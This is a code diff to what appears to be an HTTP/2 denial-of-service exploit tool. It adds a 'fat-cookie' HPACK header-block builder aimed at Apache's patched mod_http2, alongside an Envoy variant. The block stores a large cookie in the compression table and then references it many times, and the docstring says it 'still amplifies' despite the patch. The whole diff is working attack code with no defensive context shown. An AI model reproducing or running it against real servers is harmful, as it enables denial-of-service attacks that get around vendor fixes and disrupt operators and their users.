@@ -73,6 +73,19 @@ def build_httpd_block(authority: str, path: str, refs: int) -> bytes:
     return bytes(block)
 
 
+def build_httpd_fat_block(authority: str, path: str, refs: int, cookie_value_size: int) -> bytes:
+    """Fat-cookie variant for patched mod_http2 — non-empty crumbs count but still amplify."""
+    cookie_value = b"x" * cookie_value_size
+    block = bytearray()
+    block += indexed(2)
+    block += indexed(7)
+    block += literal_indexed_name_without_indexing(4, path.encode())
+    block += literal_indexed_name_without_indexing(1, authority.encode())
+    block += literal_indexed_name_with_indexing(32, cookie_value)
+    block += indexed(62) * refs
+    return bytes(block)
+
+
 def build_envoy_block(authority: str, cookie_value_size: int, refs: int) -> bytes:
     cookie_value = b"x" * cookie_value_size
     block = bytearray()
@@ -88,6 +101,8 @@ def build_envoy_block(authority: str, cookie_value_size: int, refs: int) -> byte
 def build_block(cfg: CookieAttackConfig, host: str) -> bytes:
     sni = cfg.server_name or host
     if cfg.variant == "httpd":
+        if cfg.cookie_value_size > 0:
+            return build_httpd_fat_block(sni, cfg.path, cfg.refs, cfg.cookie_value_size)
         return build_httpd_block(sni, cfg.path, cfg.refs)
     return build_envoy_block(sni, cfg.cookie_value_size, cfg.refs)
 
